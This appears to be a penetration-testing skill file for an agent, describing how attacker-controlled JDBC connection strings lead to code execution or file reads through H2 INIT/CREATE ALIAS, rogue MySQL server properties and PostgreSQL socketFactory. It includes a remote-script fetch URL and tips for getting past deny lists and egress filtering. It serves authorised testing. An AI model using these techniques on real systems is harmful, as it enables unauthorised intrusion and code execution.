---
name: web-jdbc-attacks
description: >
  Turn an attacker-controllable database connection string / JDBC URL into RCE via the driver
  itself. Load when an app lets you set a DB host/URL/driver: a "test connection" form, a data-source
  config, an ETL/reporting/integration tool, or a processor that takes a JDBC URL. Signals: a
  jdbc: URL field, H2/MySQL/Postgres connection settings, Apache NiFi/Mirth/Metabase/DBeaver-style
  data-source config, "connection string", driver properties you can edit.
domain: web
type: technique
stability: learning
modes: [pentest, bugbounty]
severity: critical
owasp: [A03:2021-Injection, A08:2021-Software-and-Data-Integrity-Failures]
cwe: [CWE-94, CWE-502, CWE-749]
tools: [burp]
schema_version: 1
---

# JDBC / connection-string attacks

## When it applies
An application lets you influence a database connection — a full JDBC URL, host/port, or driver
properties — via a "test connection" button, a data-source/integration config, or a processor in an
ETL/automation tool (NiFi, Mirth, reporting suites). The connection *itself* becomes the exploit:
several JDBC drivers execute code or read files as a side effect of connecting.

## Why it works
JDBC drivers do more than open a socket — they honor URL properties that were designed for
convenience and are dangerous with an attacker-controlled URL. You don't need valid credentials to a
real DB; you point the driver at *your* server (or an in-process engine) and let a driver feature run
code in the app's JVM.

## Method
1. **Find the controllable knob** — a JDBC URL field, or host/params you can edit; a "test
   connection" action that dials out is ideal (blind-friendly, no data needed).
2. **Confirm outbound control** — point it at a listener you own and watch for the driver's
   connection (OOB proof the URL is honored).
3. **Pick the driver primitive:**
   - **H2** — `CREATE ALIAS` maps a Java method to SQL, so `INIT=RUNSCRIPT FROM 'http://you/x.sql'`
     (or an inline `CREATE ALIAS ... AS $$ ... $$`) executes Java on connect → RCE in the JVM. A
     classic when an app lets you set an H2 JDBC URL (e.g. via a processor's connection pool).
   - **MySQL (malicious server)** — a rogue MySQL server + `allowLoadLocalInfile=true` /
     `autoDeserialize=true` / `queryInterceptors` can read client files or trigger deserialization
     gadget chains in the connecting app.
   - **PostgreSQL / others** — `socketFactory`/`socketFactoryArg` and similar properties can be
     abused to instantiate attacker-named classes.
4. **Escalate deserialization** where the driver pulls objects — combine with `web-deserialization`
   gadget chains on the classpath.
5. **Report the impact**, not the connection — RCE/file-read in the app context, validated per
   `reporting-triage-validation`.

## Gotchas
- **No real DB required** — the point is the driver's behavior; a "test connection" that "fails" may
  still have executed your `INIT`/read your file.
- **Property allow/deny lists** vary by driver version — a blocked property (patched
  `autoDeserialize`) doesn't mean another (H2 `INIT`) is blocked.
- **Classpath decides deserialization impact** — no gadget on the classpath, no RCE that way; pivot
  to a driver that runs code directly (H2).
- **Egress-filtered targets** — favor in-process primitives (H2 inline `CREATE ALIAS`) over
  fetch-from-URL when the app can't reach you.

## Verify success
Code execution or file read in the application's JVM/host from a connection you controlled (e.g. an
H2 `CREATE ALIAS` command runs, or an OOB hit + a returned file), not merely a reflected error.

## References
"Make JDBC Attacks Brilliant Again" research; H2 `CREATE ALIAS`/`INIT` docs; MySQL JDBC client
properties; CWE-502/94. Related: `web-deserialization`, `web-ssrf`.
